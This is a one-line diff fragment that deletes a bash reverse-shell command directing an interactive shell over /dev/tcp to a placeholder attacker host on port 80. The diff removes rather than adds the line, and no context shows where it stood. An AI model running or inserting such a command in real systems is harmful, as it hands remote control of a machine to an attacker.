@@ -1,1 +1,0 @@
-bash -i >& /dev/tcp/ATTACKER_IP/80 0>&1
